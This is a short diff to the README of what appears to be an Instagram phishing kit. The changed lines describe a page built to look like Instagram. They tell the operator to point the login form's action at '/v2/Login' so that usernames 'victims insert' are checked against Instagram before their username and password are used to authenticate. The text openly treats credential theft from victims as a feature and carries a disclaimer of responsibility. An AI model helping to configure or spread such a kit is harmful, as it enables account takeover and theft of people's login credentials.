@@ -19,9 +19,18 @@ You are solely responsible for your actions, that's obviously not me.**<br/>
 
 
 ==============================================================
+## ⚠️ Attention for use instageram validation change
+###  In `index.html` set **action** to `/v2/Login` to use instageram api validate user  inputs
+
+
+
+
+==============================================================
 ## ♨️ Features
 
-* Validate the username that victims insert with Instageram itself !!!
+* Validate the username that victims insert with Instageram !!!
+
+* first validate username then auth with user & pass to instageram 
 
 * Similarity to instageram
 
